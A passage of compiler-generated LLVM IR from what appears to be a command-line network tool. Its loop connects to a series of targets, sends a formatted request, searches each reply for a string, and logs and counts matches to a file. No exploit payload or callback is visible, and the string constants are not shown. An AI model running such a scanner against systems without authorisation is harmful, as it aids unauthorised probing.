  %391 = call i32 (i8*, i8*, ...) @sprintf(i8* %385, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.36, i64 0, i64 0), i8* %390)
  %392 = load i32, i32* %18, align 4
  %393 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i64 0, i64 0
  %394 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i64 0, i64 0
  %395 = call i32 @strlen(i8* %394)
  %396 = call i32 @write(i32 %392, i8* %393, i32 %395)
  %397 = load i32, i32* %18, align 4
  %398 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %399 = call i32 @recv(i32 %397, i8* %398, i32 1000, i32 0)
  %400 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %401 = call i64 @strstr(i8* %400, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.37, i64 0, i64 0))
  %402 = icmp ne i64 %401, 0
  br i1 %402, label %403, label %426

403:                                              ; preds = %355
  %404 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0))
  %405 = load i8*, i8** %9, align 8
  %406 = icmp ne i8* %405, null
  br i1 %406, label %407, label %423

407:                                              ; preds = %403
  %408 = getelementptr inbounds [48 x i8], [48 x i8]* %16, i64 0, i64 0
  %409 = load i8**, i8*** %30, align 8
  %410 = load i32, i32* %19, align 4
  %411 = sext i32 %410 to i64
  %412 = getelementptr inbounds i8*, i8** %409, i64 %411
  %413 = load i8*, i8** %412, align 8
  %414 = load i8**, i8*** %30, align 8
  %415 = load i32, i32* %19, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds i8*, i8** %414, i64 %416
  %418 = load i8*, i8** %417, align 8
  %419 = call i32 (i8*, i8*, ...) @sprintf(i8* %408, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.39, i64 0, i64 0), i8* %413, i8* %418)
  %420 = load i32*, i32** %7, align 8
  %421 = getelementptr inbounds [48 x i8], [48 x i8]* %16, i64 0, i64 0
  %422 = call i32 @fprintf(i32* %420, i8* %421)
  br label %423

423:                                              ; preds = %407, %403
  %424 = load i32, i32* %17, align 4
  %425 = add nsw i32 %424, 1
  store i32 %425, i32* %17, align 4
  br label %428

426:                                              ; preds = %355
  %427 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i64 0, i64 0))
  br label %428

428:                                              ; preds = %426, %423
  %429 = load i32, i32* %18, align 4
  %430 = call i32 @close(i32 %429)
  %431 = load i32, i32* %19, align 4
  %432 = add nsw i32 %431, 1
  store i32 %432, i32* %19, align 4
  br label %351

433:                                              ; preds = %351
  %434 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.41, i64 0, i64 0))
  %435 = load i32, i32* %17, align 4
  %436 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.42, i64 0, i64 0), i32 %435)
  br label %437

437:                                              ; preds = %433, %337, %328
  %438 = load i8*, i8** %9, align 8
  %439 = icmp ne i8* %438, null
  br i1 %439, label %440, label %445

440:                                              ; preds = %437
  %441 = load i32*, i32** %7, align 8
  %442 = call i32 @fprintf(i32* %441, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0))
  %443 = load i32*, i32** %7, align 8
  %444 = call i32 @fclose(i32* %443)
  br label %445

445:                                              ; preds = %68, %73, %440, %437
  %446 = load i32, i32* %3, align 4
  ret i32 %446
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @m00(...) #2

declare dso_local i32 @usage(i8*) #2

declare dso_local signext i8 @getopt(i32, i8**, i8*) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i64 @malloc(i32) #2

declare dso_local i32 @conn(i8*, i32) #2

declare dso_local i32 @sprintf(i8*, i8*, ...) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @verbose(i8*) #2

declare dso_local i64 @strstr(i8*, i8*) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @fprintf(i32*, i8*) #2

declare dso_local i32 @fgets(i8*, i32, i32*) #2

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @fclose(i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
